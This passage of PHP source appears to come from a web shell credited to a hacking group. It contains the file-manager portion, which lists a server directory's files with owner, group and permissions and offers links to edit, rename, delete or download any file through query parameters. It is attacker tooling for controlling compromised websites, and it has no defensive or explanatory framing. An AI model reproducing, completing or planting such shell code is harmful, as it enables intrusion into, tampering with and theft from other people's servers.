			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}


	echo "<center>Copyright &copy; ".date("Y")." - <a href='https://garudasecurityhacker.blogspot.com/' target='_blank'><font color=lime>Garuda Security Hacker</font></a></center>";
}
?>
</html>
